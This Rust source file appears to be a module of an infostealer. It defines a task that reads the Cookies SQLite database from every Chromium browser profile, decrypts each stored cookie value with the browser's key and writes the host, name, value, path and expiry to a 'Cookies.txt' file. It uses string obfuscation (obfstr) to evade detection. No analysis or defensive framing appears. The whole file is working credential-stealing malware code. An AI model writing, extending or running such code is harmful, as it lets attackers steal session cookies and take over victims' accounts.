use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
use alloc::sync::Arc;
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const COOKIES_HOST_KEY: usize        = 1;
const COOKIES_NAME: usize            = 3;
const COOKIES_ENCRYPTED_VALUE: usize = 5;
const COOKIES_PATH: usize            = 6;
const COOKIES_EXPIRES_UTC: usize     = 7;

pub(super) struct CookiesTask {
    browser: Arc<BrowserData>
}

impl CookiesTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl Task for CookiesTask {
    parent_name!("Cookies.txt");

    unsafe fn run(&self, parent: &Path) {
        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles, 
            |profile| profile / s!("Network") / s!("Cookies"),
            s!("Cookies"),
            |record| extract_cookie_from_record(record, &self.browser)
        ) else {
            return
        };

        let _ = to_string_and_write_all(&cookies, "\n", parent);
    }
}

fn extract_cookie_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Cookie> {
    let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?.to_owned();
    let name = record.get_value(COOKIES_NAME)?.as_string()?.to_owned();
    let path = record.get_value(COOKIES_PATH)?.as_string()?.to_owned();
    let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;

    let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
    let value = unsafe { browser_data.decrypt_data(encrypted_value) }?;

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc
    })
}